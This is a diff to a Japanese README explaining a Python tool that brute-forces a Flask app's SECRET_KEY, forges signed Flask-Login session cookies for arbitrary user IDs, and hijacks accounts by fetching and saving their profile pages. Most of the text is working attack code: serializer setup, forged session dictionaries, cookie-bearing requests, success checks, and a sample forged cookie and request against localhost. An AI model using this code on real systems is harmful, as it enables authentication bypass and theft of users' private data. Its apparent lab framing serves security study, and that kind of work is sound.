@@ -22,7 +22,7 @@ pip install -r requirements.txt
 - 各候補を順次試行し、正しいSECRET_KEYを特定
 
 ### 2. セッションデータの偽造
-- `_user_id`, `_fresh`, `_id`を含むセッションデータの生成
+- `_user_id`, `_fresh`, `_id`を含む標準的なFlask-Loginセッションデータ構造の生成
 - 指定したユーザーIDでのセッション偽造
 - Flaskの`SecureCookieSessionInterface`を使用した署名付きセッションクッキーの生成
 
@@ -36,11 +36,10 @@ pip install -r requirements.txt
 - 各ユーザーIDに対して個別にセッションハイジャックを実行
 - 各ユーザーIDごとにHTMLファイルを保存
 
-### 5. 詳細なログ出力
+### 5. 簡潔なログ出力
 - 各ステップの進行状況を表示
-- セッションデータの内容を表示
 - 生成されたセッションクッキーの表示
-- アクセス結果の詳細な表示
+- アクセス結果の表示
 
 ## 使用方法
 
@@ -94,104 +93,100 @@ parser.add_argument('-i', dest='user_id', default='1', help='攻撃対象のユ�
 
 `argparse`を使用してコマンドライン引数を解析します。`-u`（または`--url`）は必須で、`-i`でユーザーIDを指定できます。
 
-### 2. ユーザーIDの範囲解析（32-48行目）
+### 2. ユーザーIDの範囲解析（6-15行目）
 
 ```python
 def parse_user_ids(user_id_str):
-    """ユーザーID文字列をパースしてリストを返す（範囲指定に対応）"""
+    """ユーザーID文字列をパースしてリストを返す"""
     if '-' in user_id_str:
-        # 範囲指定（例: 1-2）
-        start, end = user_id_str.split('-', 1)
-        start = int(start.strip())
-        end = int(end.strip())
-        if start > end:
-            start, end = end, start
-        return [str(i) for i in range(start, end + 1)]
-    else:
-        # 単一のID
-        return [user_id_str]
+        try:
+            start, end = map(int, user_id_str.split('-', 1))
+            return [str(i) for i in range(min(start, end), max(start, end) + 1)]
+        except ValueError:
+            print(f"[!] 警告: 無効な範囲指定 '{user_id_str}'。単一IDとして扱います。")
+            return [user_id_str]
+    return [user_id_str]
 ```
 
-`-i`オプションで指定された文字列を解析します。`1-5`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`のようなリストに変換します。
+`-i`オプションで指定された文字列を解析します。`1-5`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`のようなリストに変換します。無効な範囲指定（例: `abc-def`）の場合は、警告を表示して単一IDとして扱います。
 
-### 3. SECRET_KEYの辞書攻撃（78-123行目）
+### 3. SECRET_KEYの辞書攻撃（55-71行目）
 
 ```python
-for secret_key in SECRET_KEYS:
-    # Flaskアプリケーションを作成してセッションシリアライザーを取得
+def discover_secret_key(secret_keys, target_url, test_user_id):
+    """SECRET_KEYを総当たりで特定"""
+    for secret_key in secret_keys:
+        serializer = test_secret_key(secret_key, target_url, test_user_id)
+        if serializer:
+            return secret_key, serializer
+    # フォールバック
+    return secret_keys[0], create_serializer(secret_keys[0])
+```
+
+各SECRET_KEY候補に対して、`test_secret_key`関数で実際のHTTPリクエストを送信して検証します。成功した場合、そのSECRET_KEYとシリアライザーを返します。
+
+### 4. セッションデータの偽造（25-27行目）
+
+```python
+def create_session_data(user_id):
+    """偽造するセッションデータを作成"""
+    return {"_user_id": user_id, "_fresh": True, "_id": user_id}
+```
+
+Flaskの標準的なセッションデータ構造に合わせて、`_user_id`、`_fresh`、`_id`を含む辞書を作成します。これがセッションクッキーにエンコードされます。
+
+### 5. Flaskセッションクッキーの生成（18-22行目、47-52行目）
+
+```python
+def create_serializer(secret_key):
+    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
     app = Flask(__name__)
     app.config['SECRET_KEY'] = secret_key
-    session_interface = app.session_interface
-    serializer = session_interface.get_signing_serializer(app)
-    
-    # セッションクッキーを生成
-    test_cookie = serializer.dumps(test_fake_session)
-    
-    # テスト用のセッションを作成
-    test_session = requests.Session()
-    test_session.cookies.set('session', test_cookie)
-    
-    # プロフィールページにアクセスしてテスト
-    test_response = test_session.get(f'{target_url}/profile', allow_redirects=False)
-    
-    # 成功の判定
-    if test_response.status_code == 200:
-        if 'ログイン' not in test_response.text or ('プロフィール' in test_response.text and 'ユーザー名' in test_response.text):
-            is_success = True
-```
+    return app.session_interface.get_signing_serializer(app)
 
-各SECRET_KEY候補に対して、実際にFlaskアプリケーションを作成し、セッションクッキーを生成してHTTPリクエストで検証します。ステータスコード200でログインページ以外が返された場合、そのSECRET_KEYが正しいと判定します。
-
-### 4. セッションデータの偽造（144-149行目）
-
-```python
-fake_session = {
-    "_user_id": user_id,
-    "_fresh": True,
-    "_id": user_id
-}
-```
-
-Flaskのセッションデータ構造に合わせて、`_user_id`、`_fresh`、`_id`を含む辞書を作成します。これがセッションクッキーにエンコードされます。
-
-### 5. Flaskセッションクッキーの生成（132-136行目、151-152行目）
-
-```python
-app = Flask(__name__)
-app.config['SECRET_KEY'] = used_secret_key
-session_interface = app.session_interface
-serializer = session_interface.get_signing_serializer(app)
-
-fake_cookie = serializer.dumps(fake_session)
+# 使用例
+serializer = create_serializer(secret_key)
+cookie = serializer.dumps(create_session_data(user_id))
 ```
 
 Flaskの`SecureCookieSessionInterface`を使用して、セッションデータを署名付きのセッションクッキーにエンコードします。これにより、サーバーが検証可能な有効なセッションクッキーが生成されます。
 
-### 6. プロフィールページへのアクセス（168-183行目）
+### 6. プロフィールページへのアクセス（40-44行目、83行目）
 
 ```python
-session = requests.Session()
-session.cookies.set('session', fake_cookie)
+def make_request_with_cookie(cookie, target_url):
+    """セッションクッキーでリクエストを送信"""
+    session = requests.Session()
+    session.cookies.set('session', cookie)
+    return session.get(f'{target_url}/profile', allow_redirects=False)
 
-response = session.get(f'{target_url}/profile', allow_redirects=False)
+# 使用例
+response = make_request_with_cookie(cookie, target_url)
 ```
 
-偽造したセッションクッキーを`requests.Session`に設定し、プロフィールページにアクセスします。`allow_redirects=False`にすることで、リダイレクトの挙動を確認できます。
+共通関数`make_request_with_cookie`を使用して、偽造したセッションクッキーでプロフィールページにアクセスします。`allow_redirects=False`にすることで、リダイレクトの挙動を確認できます。
 
-### 7. 成功判定とHTMLの保存（186-201行目）
+### 7. 成功判定とHTMLの保存（30-37行目、92-102行目）
 
 ```python
-if response.status_code == 200:
-    if "プロフィール" in response.text and "ユーザー名" in response.text:
-        print("[+] 攻撃成功: 認証をバイパスしました")
-        
-        # HTML情報をtxtファイルに出力
-        output_filename = f"profile_page_user_{user_id}.html"
-        with open(output_filename, 'w', encoding='utf-8') as f:
-            f.write(response.text)
+def is_attack_successful(response):
+    """レスポンスから攻撃成功を判定"""
+    if response.status_code == 200:
+        text = response.text
+        return not ('ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text)
+    elif response.status_code == 302:
+        return '/login' not in response.headers.get('Location', '').lower()
+    return False
+
+# 使用例
+if is_attack_successful(response):
+    print("[+] 攻撃成功: 認証をバイパスしました")
+    output_filename = f"profile_page_user_{user_id}.html"
+    with open(output_filename, 'w', encoding='utf-8') as f:
+        f.write(response.text)
 ```
 
-ステータスコード200で、かつレスポンス本文に「プロフィール」と「ユーザー名」が含まれている場合、攻撃成功と判定します。成功した場合、HTMLを`profile_page_user_{id}.html`として保存します。
+`is_attack_successful`関数で、レスポンスのステータスコードと内容を確認して認証バイパスの成功/失敗を判定します。ステータスコード200でログインページでない場合、または302で`/login`以外へのリダイレクトの場合、成功と判定します。成功した場合、HTMLを`profile_page_user_{id}.html`として保存します。
 
 ## 対応フレームワーク
 
@@ -238,33 +233,31 @@ HTTPリクエストの送信（クッキー付き）
 保護されたリソースへのアクセス成功
 ```
 
-### ステップ1: Flaskアプリケーションの設定（132-136行目）
+### ステップ1: Flaskアプリケーションの設定（18-22行目）
 
 ```python
-app = Flask(__name__)
-app.config['SECRET_KEY'] = used_secret_key
-session_interface = app.session_interface
-serializer = session_interface.get_signing_serializer(app)
+def create_serializer(secret_key):
+    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
+    app = Flask(__name__)
+    app.config['SECRET_KEY'] = secret_key
+    return app.session_interface.get_signing_serializer(app)
 ```
 
 **説明**:
 - 発見した`SECRET_KEY`を使用してFlaskアプリケーションインスタンスを作成
 - `app.config['SECRET_KEY']`に設定することで、セッションクッキーの署名・検証に使用される
-- `session_interface`はFlaskのデフォルトの`SecureCookieSessionInterface`を取得
 - `get_signing_serializer(app)`で、セッションデータをシリアライズ（エンコード）・デシリアライズ（デコード）するためのシリアライザーを取得
 
 **技術的詳細**:
 - Flaskのセッションクッキーは`itsdangerous`ライブラリを使用して署名される
 - シリアライザーは`SECRET_KEY`を使用してHMAC署名を生成し、改ざんを防ぐ
 
-### ステップ2: 偽造セッションデータの作成（144-149行目）
+### ステップ2: 偽造セッションデータの作成（25-27行目）
 
 ```python
-fake_session = {
-    "_user_id": user_id,
-    "_fresh": True,
-    "_id": user_id
-}
+def create_session_data(user_id):
+    """偽造するセッションデータを作成"""
+    return {"_user_id": user_id, "_fresh": True, "_id": user_id}
 ```
 
 **説明**:
@@ -277,10 +270,10 @@ fake_session = {
 - Flask-Loginなどの認証拡張機能が使用する標準的なセッションデータ構造
 - サーバー側の認証ミドルウェアが`_user_id`を確認してユーザーを識別する
 
-### ステップ3: セッションクッキーの生成（152行目）
+### ステップ3: セッションクッキーの生成（80行目）
 
 ```python
-fake_cookie = serializer.dumps(fake_session)
+cookie = serializer.dumps(create_session_data(user_id))
 ```
 
 **説明**:
@@ -297,11 +290,17 @@ eyJfdXNlcl9pZCI6IjEiLCJfZnJlc2giOnRydWUsIl9pZCI6IjEifQ.aS66_g.kPRYHYEhk4vpdOw-XJ
 │─────────── Base64エンコードされたセッションデータ ───────────││timestamp││─── HMAC署名 ───│
 ```
 
-### ステップ4: HTTPリクエストの準備（164-166行目）
+### ステップ4: HTTPリクエストの準備（40-44行目、83行目）
 
 ```python
-session = requests.Session()
-session.cookies.set('session', fake_cookie)
+def make_request_with_cookie(cookie, target_url):
+    """セッションクッキーでリクエストを送信"""
+    session = requests.Session()
+    session.cookies.set('session', cookie)
+    return session.get(f'{target_url}/profile', allow_redirects=False)
+
+# 使用例
+response = make_request_with_cookie(cookie, target_url)
 ```
 
 **説明**:
@@ -316,10 +315,10 @@ Host: localhost:5000
 Cookie: session=eyJfdXNlcl9pZCI6IjEiLCJfZnJlc2giOnRydWUsIl9pZCI6IjEifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
 ```
 
-### ステップ5: 保護されたエンドポイントへのアクセス（170行目）
+### ステップ5: 保護されたエンドポイントへのアクセス（83行目）
 
 ```python
-response = session.get(f'{target_url}/profile', allow_redirects=False)
+response = make_request_with_cookie(cookie, target_url)
 ```
 
 **説明**:
@@ -349,39 +348,42 @@ response = session.get(f'{target_url}/profile', allow_redirects=False)
 - `SECRET_KEY`が正しければ、攻撃者は任意の`_user_id`を含むセッションクッキーを生成できる
 - これがセッションハイジャックの根本的な脆弱性
 
-### ステップ7: レスポンスの検証（186-203行目）
+### ステップ7: レスポンスの検証（30-37行目、92-102行目）
 
 ```python
-if response.status_code == 200:
-    if "プロフィール" in response.text and "ユーザー名" in response.text:
-        print("[+] 攻撃成功: 認証をバイパスしました")
-        # HTMLを保存
+def is_attack_successful(response):
+    """レスポンスから攻撃成功を判定"""
+    if response.status_code == 200:
+        text = response.text
+        return not ('ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text)
+    elif response.status_code == 302:
+        return '/login' not in response.headers.get('Location', '').lower()
+    return False
+
+# 使用例
+if is_attack_successful(response):
+    print("[+] 攻撃成功: 認証をバイパスしました")
+    # HTMLを保存
 ```
 
 **説明**:
-- **ステータスコード200**: リクエストが成功し、プロフィールページが返された
-- **コンテンツ検証**: レスポンス本文に「プロフィール」と「ユーザー名」が含まれているか確認
-  - これにより、ログインページが返された場合を除外
-- **成功判定**: 両方の条件を満たす場合、認証バイパスが成功したと判定
+- **ステータスコード200**: ログインページでない場合、成功と判定
+  - ログインページの判定は、`'ログイン'`、`'username'`、`'<title>ログイン'`の3つすべてが含まれる場合
+- **ステータスコード302**: `/login`以外へのリダイレクトの場合、成功と判定
+- **リダイレクト処理（86-90行目）**: `/login`へのリダイレクトの場合は、リダイレクト先にアクセスして最終的なレスポンスを取得
 
-**リダイレクト処理（174-183行目）**:
-```python
-if response.status_code == 302:
-    redirect_location = response.headers.get('Location', '')
-    if '/login' in redirect_location:
-        print("[!] ログインページにリダイレクトされました（セッションが無効）")
-```
-
-- ステータスコード302（リダイレクト）の場合、`Location`ヘッダーを確認
-- `/login`へのリダイレクトは認証失敗を示す
-- それ以外のリダイレクトは認証成功の可能性がある
-
-### ステップ8: 成功時のHTML保存（194-201行目）
+### ステップ8: 成功時のHTML保存（94-100行目）
 
 ```python
-output_filename = f"profile_page_user_{user_id}.html"
-with open(output_filename, 'w', encoding='utf-8') as f:
-    f.write(response.text)
+if is_attack_successful(response):
+    print("[+] 攻撃成功: 認証をバイパスしました")
+    output_filename = f"profile_page_user_{user_id}.html"
+    try:
+        with open(output_filename, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+        print(f"[*] HTML情報を {output_filename} に出力しました")
+    except Exception as e:
+        print(f"[!] HTML情報の出力エラー: {e}")
 ```
 
 **説明**:
